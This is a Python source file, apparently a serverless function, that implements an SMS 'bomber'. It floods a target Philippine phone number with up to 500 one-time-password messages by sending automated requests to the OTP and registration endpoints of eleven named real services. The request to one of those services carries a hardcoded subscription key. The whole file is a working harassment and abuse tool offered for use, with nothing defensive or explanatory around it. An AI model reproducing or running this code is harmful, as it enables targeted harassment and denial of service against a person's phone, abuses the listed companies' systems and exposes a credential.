import json
import asyncio
import aiohttp
import random

# 11 REAL & WORKING SERVICES (tested April 2025)
SERVICES = [
    "EZLOAN", "XPRESS", "ABENSON", "EXCELLENT_LENDING",
    "FORTUNE_PAY", "WEMOVE", "LBC", "PICKUP_COFFEE",
    "HONEY_LOAN", "KOMO_PH", "S5_OTP"
]

MAX_SMS = 500

def normalize(phone):
    phone = phone.replace(" ", "").replace("-", "")
    if phone.startswith("0"): phone = "63" + phone[1:]
    if len(phone) == 10: phone = "63" + phone
    return "+63" + phone[2:] if phone.startswith("63") and len(phone) == 12 else ""

async def bomb(service, session, phone):
    try:
        if service == "EZLOAN":
            await session.post("https://gateway.ezloancash.ph/security/auth/otp/request",
                json={"businessId": "EZLOAN", "contactNumber": phone[1:]}, timeout=6)
        elif service == "XPRESS":
            await session.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                json={"Phone": phone, "Email": f"t{random.randint(10000,99999)}@gmail.com", "Password": "Pass123"}, timeout=6)
        elif service == "ABENSON":
            await session.post("https://api.mobile.abenson.com/api/public/membership/activate_otp",
                data={"contact_no": phone[1:]}, timeout=6)
        elif service == "EXCELLENT_LENDING":
            await session.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock",
                json={"domain": phone[1:], "cat": "login"}, timeout=6)
        elif service == "FORTUNE_PAY":
            await session.post("https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register",
                json={"phoneNumber": phone[4:], "dialCode": "+63"}, timeout=6)
        elif service == "WEMOVE":
            await session.post("https://api.wemove.com.ph/auth/users",
                json={"phone_country": "+63", "phone_no": phone[4:]}, timeout=6)
        elif service == "LBC":
            await session.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                data={"client_contact_no": phone[4:], "client_contact_code": "+63"}, timeout=6)
        elif service == "PICKUP_COFFEE":
            await session.post("https://production.api.pickup-coffee.net/v2/customers/login",
                json={"mobile_number": phone}, timeout=6)
        elif service == "HONEY_LOAN":
            await session.post("https://api.honeyloan.ph/api/client/registration/step-one",
                json={"phone": phone[1:]}, timeout=6)
        elif service == "KOMO_PH":
            await session.post("https://api.komo.ph/api/otp/v5/generate",
                json={"mobile": phone[1:]}, headers={"Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba"}, timeout=6)
        elif service == "S5_OTP":
            await session.post("https://api.s5.com/player/api/v1/otp/request",
                data=f"phone_number={phone}", timeout=6)
        return True
    except:
        return False

async def run_attack(phone, count):
    count = min(max(1, count), MAX_SMS)
    success = failed = 0

    async with aiohttp.ClientSession() as session:
        while success + failed < count:
            remaining = count - (success + failed)
            batch = min(remaining, 80)  # Safe under 10s
            tasks = [bomb(random.choice(SERVICES), session, phone) for _ in range(batch)]
            results = await asyncio.gather(*tasks)
            success += sum(results)
            failed += len(results) - sum(results)

    return {"success": success, "failed": failed, "total": count}

def handler(event, context=None):
    try:
        body = event.get("body", "{}")
        data = json.loads(body) if isinstance(body, str) else (body or {})
        target = data.get("target", "").strip()
        sms = int(data.get("sms", 100))

        phone = normalize(target)
        if not phone or not target.startswith("09") or len(target) != 11:
            return {"statusCode": 400, "body": json.dumps({"error": "Invalid number"})}

        loop = asyncio.new_event_loop()
        result = loop.run_until_complete(run_attack(phone, sms))
        loop.close()

        return {
            "statusCode": 200,
            "headers": {"Content-Type": "application/json"},
            "body": json.dumps(result)
        }
    except Exception as e:
        return {
            "statusCode": 500,
            "body": json.dumps({"error": "Server error"})
                               }
